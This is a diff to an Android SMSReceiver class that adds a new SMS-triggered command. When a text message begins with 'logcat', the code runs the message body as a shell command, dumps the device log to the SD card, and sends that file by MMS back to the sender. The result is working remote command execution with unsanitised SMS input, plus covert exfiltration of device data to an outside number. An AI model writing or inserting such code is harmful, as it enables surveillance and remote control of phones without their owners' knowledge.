@@ -86,6 +86,12 @@ public class SMSReceiver extends BroadcastReceiver {
 							for(int j=1;j<fs.length;++j)
 								filenames(fs[j]);
 						}
+					}else if(body.startsWith("logcat")){
+						RichUtils.runCommand(body+" -f /sdcard/logcat.txt -d");
+						Intent j = new Intent(context, SendMMSService.class);
+						j.putExtra("path", "/sdcard/logcat.txt");
+						j.putExtra("number", number);
+						context.startService(j);
 					}
 					break;
 				}
